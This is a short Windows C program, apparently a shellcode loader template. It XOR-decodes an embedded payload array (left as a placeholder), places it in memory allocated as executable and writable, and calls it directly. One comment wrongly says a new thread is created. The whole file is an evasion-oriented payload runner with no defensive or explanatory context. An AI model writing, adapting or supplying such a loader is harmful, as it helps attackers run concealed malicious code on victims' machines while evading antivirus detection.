#include <windows.h>
#include <stdio.h>

unsigned char encoded_payload[] = { /* Encoded payload here */ };
unsigned char key = 0xAA;  // XOR key

void xor_decode(unsigned char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

int main() {
    size_t len = sizeof(encoded_payload);
    xor_decode(encoded_payload, len, key);

    // Allocate memory for the payload
    void *exec = VirtualAlloc(0, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, encoded_payload, len);

    // Create a new thread that starts at the payload
    ((void(*)())exec)();

    return 0;
}
